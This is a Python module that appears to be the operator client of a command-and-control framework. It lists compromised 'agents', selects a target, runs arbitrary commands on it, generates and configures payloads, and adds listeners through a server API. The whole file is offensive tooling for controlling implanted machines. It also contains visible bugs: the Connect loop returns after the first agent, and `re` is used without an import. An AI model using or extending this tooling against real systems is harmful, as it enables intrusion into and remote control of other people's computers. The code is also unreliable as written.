from ast import arg
from stone_color.messages import *
from stone_color.tables import ascii_table
from stone_color.color import ansistr, DefaultLegacyColors

import requests as requests
import os as os
from pydoc import pager


# == Constants

TARGET = []  # [ID, host]
HTTP_SESSION = requests.session()
HTTP_POINT = ""
WSCONNECTION = None
USERNAME = ""
SESSION_ID = ""

##########################################################
######## Commands functions start with UPPERCASE #########
##########################################################


def _get_agents() -> dict:
    r = HTTP_SESSION.get(HTTP_POINT + "/get_agents/" + SESSION_ID)

    if r.status_code != 200:
        alertf(r.text)
        return

    return r.json()


def _get_listeners() -> dict:
    r = HTTP_SESSION.get(HTTP_POINT + "/get_listeners/" + SESSION_ID)

    if r.status_code != 200:
        alertf(r.text)
        return

    return r.json()


def Get_agents(*args):
    agents = _get_agents()

    if len(agents) <= 0:
        errorf("No agents connected")
        return

    table = ascii_table(["ID", "Host"], agents, start_end="\n")
    printf(table, end="")


def Connect(*args):
    if len(args) < 1:
        infof("connect <target-id>")
        return

    id_target = args[0]

    agents = _get_agents()

    for agent in agents:
        if agent[0] == id_target:
            TARGET.clear()
            TARGET.extend([id_target, agent[1]])
        return

    alertf(f"Agent with ID {id_target} not found.")


def Cmd_exec(*args):
    if len(args) < 1:
        print("cmd_exec <command>")
        return

    if len(TARGET) <= 0:
        alertf("No target selected")
        return

    WSCONNECTION.send_command(args[0], TARGET[0])


def Payload_config(*args):
    if len(args) < 1:
        infof("payload_config <payload>")
        return

    payload_name = args[0]

    r = HTTP_SESSION.post(
        HTTP_POINT + "/payload_config",
        json={"auth": SESSION_ID, "payload": payload_name},
    ).json()

    for i in range(len(r)):
        r[i][1] = str(r[i][1])

    table = ascii_table(["Config", "Required"], r, start_end="\n")
    printf(table, end="")


def Payload_gen(*args):
    if len(args) < 2:
        infof("payload_gen <payload> <output_file> [...option=value]")
        return

    payload_name = args[0]
    payload_output = args[1]
    payload_configs = args[2:]

    payload_configs_dict = {}

    for config in payload_configs:
        key, value = config.split("=")
        payload_configs_dict[key] = value

    r = HTTP_SESSION.post(
        HTTP_POINT + "/payload_generate",
        json={
            "payload": payload_name,
            "output": payload_output,
            "config": payload_configs_dict,
            "auth": SESSION_ID,
        },
    )

    infof("Output file:", r.text)


def Payload_get(*args):
    r = HTTP_SESSION.get(HTTP_POINT + "/payload_get/" + SESSION_ID)

    if r.status_code != 200:
        alertf(r.text)
    else:
        payloads = r.json()
        infof("Payloads:\n\t" + "\n\t".join(payloads))    

def Listener_add(*args):
    if len(args) < 4:
        infof("listener_add <name> <ip> <port> <type>")
        return

    name = args[0]
    ip = args[1]
    port = args[2]
    type = args[3]

    r = HTTP_SESSION.post(
        HTTP_POINT + "/add_listener",
        json={"auth": SESSION_ID, "name": name, "ip": ip, "port": port, "type": type},
    )

    if r.status_code != 200:
        alertf(r.text)
    else:
        successf("Listener added:", name)


def Listener_get(*args):
    listeners = _get_listeners()

    if len(listeners) <= 0:
        errorf("No listeners available")
        return

    table = ascii_table(["Name", "IP", "Port", "Type"], listeners, start_end="\n")
    printf(table, end="")


def Listener_type(*args):
    r = HTTP_SESSION.get(HTTP_POINT + "/listener_types/" + SESSION_ID)

    if r.status_code != 200:
        alertf(r.text)
    else:
        successf("Listeners:\n\t" + "\n\t".join(r.json()))


def Clear(*args):
    os.system("clear")


def Quit(*args):
    print(ansistr("Bye!", 1))
    os._exit(0)


###################################
#### Special prefix functions ####
##################################


def _slashmsg(*args):
    if len(args) < 1:
        print("/msg <text>")
        return

    WSCONNECTION.send_chatmsg(" ".join(args))


def _slashmail(*args):
    if len(WSCONNECTION.MESSAGES) > 0:
        messages = [
            "\033[{}m {}\033[0m: {}".format(
                msg["color"], msg["username"], msg["message"]
            )
            for msg in WSCONNECTION.MESSAGES
        ]

        pager("\n".join(messages))
    else:
        errorf("No messages found")

def _slashchange_color(*args):
    if len(args) < 1:
        infof("/change_color")
        return

    if args[0] in [f for f in dir(DefaultLegacyColors) if not f.startswith("__")]:
        s = getattr(DefaultLegacyColors, args[0])
        printf(s.encode())
        color_n = re.search(r'\033\[(\d+)m', s).group(1)
        WSCONNECTION.color = color_n